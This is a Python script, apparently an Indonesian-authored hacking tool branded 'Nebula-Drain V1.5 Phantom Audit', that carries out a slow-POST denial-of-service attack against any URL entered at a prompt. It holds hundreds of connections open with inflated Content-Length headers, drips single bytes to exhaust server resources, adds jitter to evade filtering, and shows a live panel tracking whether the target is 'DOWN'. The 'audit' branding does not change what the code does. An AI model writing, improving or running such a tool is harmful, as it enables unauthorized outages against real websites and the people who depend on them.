import asyncio
import random
import sys
import ssl
import time
from urllib.parse import urlparse
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.live import Live
from rich.layout import Layout

console = Console()

BANNER = """
 _______        ___.         .__               .__        
 \      \   ____\_ |__  __ __|  | _____ _______|__| ______
 /   |   \_/ __ \| __ \|  |  \  | \__  \\_  __ \  |/  ___/
/    |    \  ___/| \_\ \  |  /  |__/ __ \|  | \/  |\___ \ 
\____|__  /\___  >___  /____/|____(____  /__|  |__/____  >
        \/     \/    \/                \/              \/
           [bold red]>> V1.5 PHANTOM AUDIT | BY: redzskid <<[/bold red]
"""

class NebulaDrainV15:
    def __init__(self, target_url, conns=500, pipeline=1):
        parsed = urlparse(target_url)
        self.scheme = parsed.scheme
        self.target_host = parsed.hostname
        self.port = parsed.port or (443 if self.scheme == 'https' else 80)
        self.vhost = parsed.netloc
        self.path = parsed.path if parsed.path else "/"
        self.conns = conns
        self.pipeline = pipeline
        self.active_conns = 0
        self.latency = "Waiting..."
        self.status = "Initializing"

    async def check_health(self):
        """Self-verification biar gak butuh netstat"""
        while True:
            try:
                start = time.perf_counter()
                # Coba buka koneksi TCP murni (Ping)
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.target_host, self.port), 
                    timeout=3.0
                )
                writer.close()
                await writer.wait_closed()
                ms = (time.perf_counter() - start) * 1000
                self.latency = f"{ms:.2f} ms"
                self.status = "[bold green]ONLINE[/bold green]" if ms < 500 else "[bold yellow]LAGGING[/bold yellow]"
            except:
                self.latency = "TIMEOUT"
                self.status = "[bold red]DROWNED / DOWN[/bold red]"
            await asyncio.sleep(2)

    async def strike(self):
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        
        loop = asyncio.get_running_loop()
        
        while True:
            writer = None
            try:
                # Jitter awal biar gak kena filter instan
                await asyncio.sleep(random.uniform(0.1, 1.0))
                
                reader, writer = await asyncio.open_connection(
                    self.target_host, self.port, 
                    ssl=ssl_context if self.scheme == 'https' else None,
                    server_hostname=self.target_host if self.scheme == 'https' else None
                )
                self.active_conns += 1
                
                start_time = loop.time()
                max_duration = random.uniform(120, 300)

                # Send headers
                for _ in range(self.pipeline):
                    header = (
                        f"POST {self.path} HTTP/1.1\r\n"
                        f"Host: {self.vhost}\r\n"
                        f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0\r\n"
                        f"Content-Length: {random.randint(100000, 500000)}\r\n"
                        f"Content-Type: application/x-www-form-urlencoded\r\n"
                        f"Connection: keep-alive\r\n\r\n"
                    )
                    writer.write(header.encode())
                await writer.drain()

                # Sustained Drip Phase
                while (loop.time() - start_time) < max_duration:
                    # Kirim 1 byte secara random setiap 10-20 detik
                    await asyncio.sleep(random.uniform(10, 20))
                    writer.write(random.choice(b"abcdefghijklmnopqrstuvwxyz ").to_bytes(1, 'big'))
                    await writer.drain()

            except Exception:
                pass
            finally:
                if writer:
                    writer.close()
                self.active_conns = max(0, self.active_conns - 1)
                await asyncio.sleep(random.uniform(1, 3))

async def main():
    console.clear()
    console.print(Panel(BANNER, style="bold red", expand=False))
    
    try:
        url = console.input("[bold cyan][?][/bold cyan] Target URL: ").strip()
        conns_in = console.input("[bold cyan][?][/bold cyan] Connections (Def: 500): ").strip()
        conns = int(conns_in) if conns_in else 500
        
        pipe_in = console.input("[bold cyan][?][/bold cyan] Pipeline (Def: 1): ").strip()
        pipe = int(pipe_in) if pipe_in else 1
        
        drainer = NebulaDrainV15(url, conns, pipe)
        
        # Start the background tasks
        asyncio.create_task(drainer.check_health())
        tasks = [asyncio.create_task(drainer.strike()) for i in range(conns)]
        
        with Live(console=console, refresh_per_second=4) as live:
            while True:
                table = Table(title="Nebula-Drain Live Monitor", border_style="red")
                table.add_column("Indicator", style="cyan")
                table.add_column("Real-time Value", style="white")
                
                table.add_row("Target", drainer.vhost)
                table.add_row("Active Sockets", f"[bold green]{drainer.active_conns}[/bold green] / {conns}")
                table.add_row("Server Latency", f"[bold yellow]{drainer.latency}[/bold yellow]")
                table.add_row("Server Status", drainer.status)
                
                info_panel = Panel(
                    table, 
                    title="[bold red]AUDIT IN PROGRESS[/bold red]", 
                    subtitle="Press Ctrl+C to stop",
                    border_style="red"
                )
                live.update(info_panel)
                await asyncio.sleep(0.5)

    except KeyboardInterrupt:
        console.print("\n[bold yellow][!] Stop signal received. Cleaning up...[/bold yellow]")
    except Exception as e:
        console.print(f"\n[bold red][!] Error: {e}[/bold red]")

if __name__ == "__main__":
    asyncio.run(main())
